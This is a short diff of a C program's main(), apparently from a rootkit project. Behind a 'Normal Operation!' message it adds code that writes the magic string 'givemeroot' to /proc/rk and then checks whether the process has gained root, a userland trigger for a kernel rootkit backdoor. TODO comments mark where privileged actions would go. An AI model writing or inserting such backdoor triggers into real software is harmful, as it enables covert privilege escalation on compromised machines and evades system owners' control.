@@ -22,6 +22,28 @@ void *libc;
 int main(void)
 {
     printf("Normal Operation!\r\n");
+
+    int uid = getuid();
+    int gid = getgid();
+
+    if(gid);
+
+    if(uid > 0)
+        printf("Not Root!\r\n");
+
+    int fd = open("/proc/rk", O_WRONLY);
+    write(fd, "givemeroot", 10);
+
+    uid = getuid();
+    gid = getgid();
+
+    if(uid == 0) // TODO: Root priveledged stuff
+        printf("Are Root!\r\n");
+    else
+        printf("Still Not Root!\r\n");
+
+    // TODO: drop uid/gid back to orig_uid/orig_gid
+
     return 0;
 }
 
